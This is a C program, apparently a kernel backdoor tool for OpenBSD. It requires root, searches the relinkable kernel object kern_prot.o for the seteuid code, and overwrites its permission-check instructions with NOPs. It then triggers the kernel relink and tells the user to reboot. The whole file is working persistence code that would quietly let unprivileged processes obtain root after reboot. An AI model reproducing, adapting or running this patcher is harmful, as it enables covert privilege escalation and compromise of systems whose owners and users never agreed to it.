#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h> 
#include <string.h>

// approx.. 
#define O_FILE_SIZE   118000

unsigned char orig_o[] = {
  0x54, 0x53, 0x4c, 0x8b, 0x6f, 0x20, 0x8b, 0x1e, 0x49, 0x8b, 0x45, 0x08,
  0x39, 0x58, 0x04, 0x0f, 0x84, 0x89, 0x00, 0x00, 0x00, 0x49, 0x89, 0xfe,
  0x48, 0x8b, 0x8f, 0x08, 0x02, 0x00, 0x00, 0x3b, 0x59, 0x08, 0x74, 0x10,
  0x3b, 0x59, 0x0c, 0x74, 0x0b, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x83, 0x79,
  0x04, 0x00, 0x75, 0x6c, 0x48, 0xc7, 0xc7, 0x00, 0x00, 0x00, 0x00, 0xbe,
  0x09, 0x00, 0x00, 0x00, 0xe8, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x00, 0x01, 
  0x00, 0x00, 0x00, 0x4d, 0x8b, 0x7d, 0x08, 0x41, 0x83, 0x3f, 0x00, 0x74,
  0x6f
};
unsigned int orig_o_len = 85;

unsigned char patch_o[] = {
  0x54, 0x53, 0x4c, 0x8b, 0x6f, 0x20, 0x8b, 0x1e, 0x49, 0x8b, 0x45, 0x08,
  0x39, 0x58, 0x04, 0x0f, 0x84, 0x89, 0x00, 0x00, 0x00, 0x49, 0x89, 0xfe,
  0x48, 0x8b, 0x8f, 0x08, 0x02, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90,
  0x90, 0x90, 0x90, 0x90, 0x90, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x90, 0x90,
  0x90, 0x90, 0x90, 0x90, 0x48, 0xc7, 0xc7, 0x00, 0x00, 0x00, 0x00, 0xbe,
  0x09, 0x00, 0x00, 0x00, 0xe8, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x00, 0x01, 
  0x00, 0x00, 0x00, 0x4d, 0x8b, 0x7d, 0x08, 0x90, 0x90, 0x90, 0x90, 0x90, 
  0x90 
};
unsigned int patch_o_len = 85;

void *memsrch(const void *s1, size_t len1, const void *s2, size_t len2)
{
    if (!len2)
    {
        return (void *)s1;
    }
    while (len1 >= len2) 
    {
        len1--;
        if (!memcmp(s1, s2, len2))
        {
            return (void *)s1;
        }
        s1++;
    }
    return NULL;
}

int main(void)
{
    FILE        *fp;
    void /* */ *ptr;
    size_t  numread; 
    char *kpath  = "/usr/share/relink/kernel/GENERIC/kern_prot.o";

    if(getuid() != 0)
    {
        printf("You must be root!\n");
        exit(1);
    }

    if(access( kpath, W_OK ) == -1) 
    {
        printf("Cannot access kern_prot.o - fatal\n");
        exit(1);
    }  

    fp = fopen(kpath, "rb+");
    if (fp) 
    {
        char *buf = malloc(O_FILE_SIZE);
        if (buf) 
        {
            numread = fread(buf, sizeof *buf, 
                                             O_FILE_SIZE, fp);

            char *tmp = realloc(buf, numread);
            if (tmp) 
            {
                buf = tmp;
                if((ptr = memsrch(buf, numread, orig_o, orig_o_len)) != 0)
                {
                    printf("Found seteuid function in kern_prot.o\n");
                    printf("Applying patch\n");
                    memcpy(ptr, patch_o, patch_o_len); 
                    rewind(fp);
                    fwrite(buf, 1, numread, fp);
                }
            }
            free(buf);
        }
        fclose(fp);
        system("/usr/libexec/reorder_kernel");
        printf("Finished - reboot to test\n");
        return 0;
    }
    printf("Something went wrong\n");
    return 1; 
}
